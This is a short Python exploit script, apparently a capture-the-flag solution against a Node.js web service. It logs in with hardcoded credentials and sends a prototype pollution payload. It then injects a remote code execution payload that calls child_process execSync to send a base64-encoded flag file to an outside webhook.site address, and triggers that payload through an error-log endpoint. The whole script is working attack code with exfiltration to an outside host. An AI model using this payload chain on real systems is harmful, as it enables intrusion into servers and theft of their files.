import requests
import json

post_log = "/save"
URL = "http://KxyuAdFbZrEBUWoV:DGRrMgeTyAtiNfCH@34.142.163.254:63667"
r = requests.Session()
re = r.post(URL + "/login", json={"username": "Admin", "password": "Admin@123"})
# create payload prototype
try:
  payload_proto = '{"__proto__":{"local":true}}'
  post1 = r.post(URL + post_log, json={"name": payload_proto, "thoughts":"test"},timeout=1)
except requests.exceptions.Timeout:
  print("Timeout")
  
# # merge
merge = r.get(URL + "/logs?" + f"q1=1&q2=1")
print(merge.text)

# # # post3 
try:
  payload_RCE = "const { execSync } = require('child_process');execSync('curl https://webhook.site/1a750059-e488-443d-8389-f439f5fc95a5?`base64${IFS}flag`')"
  post3 = r.post(URL + post_log, json={"name": payload_RCE, "thoughts":"test1"}, timeout=1)
except requests.exceptions.Timeout:
  print("Timeout")

# # execute payload
file3 = 2
exploit = r.post(URL + "/errorlog?" + f"q1={file3}&q2=1")
